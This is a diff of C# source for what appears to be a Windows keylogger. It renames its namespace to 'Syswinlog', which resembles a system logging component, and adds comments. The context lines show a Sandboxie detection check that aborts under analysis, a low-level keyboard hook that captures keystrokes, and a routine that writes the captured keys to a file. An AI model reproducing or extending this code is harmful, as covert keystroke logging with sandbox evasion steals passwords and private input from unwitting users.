@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Collections.Generic;
 using System.Linq;
@@ -12,7 +12,7 @@ using ConsoleApp2.Constants;
 using ConsoleApp2.Startup;
 using ConsoleApp2.HostInfo;
 
-namespace ConsoleApp1
+namespace Syswinlog
 {
     class Program
     {
@@ -20,6 +20,7 @@ namespace ConsoleApp1
         {
             if( Utils.DetectSandboxie() ) {
                 Terminate( "Sandboxie detected! [ABORTING]" );
+                // StatusLog.Log( "Sandboxie detected! [ABORTING]" );
             }
             _hookptr = SetHook(KeyBoardProcCallback);
             SetConsoleWindow(
@@ -32,6 +33,11 @@ namespace ConsoleApp1
             NativeMethods.UnhookWindowsHookEx(_hookptr);
         }
 
+        /// <summary>
+        ///     Register the LowLevelKeyboardProc callback function
+        /// </summary>
+        /// <param name="func">The callback function</param>
+        /// <returns> Returns the newly created hook procedure </returns>
         public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
         {
             using (Process proc = Process.GetCurrentProcess()) {
@@ -64,7 +70,7 @@ namespace ConsoleApp1
         }
 
         /// <summary>
-        ///     Write the buffer to the key
+        ///     Write the buffer to the file and then after that immediately clears that buffer
         /// </summary>
         /// <returns> Doesn't return a value </returns>
         public static void DispatchKey(char key, int vkey, bool isPrintable)
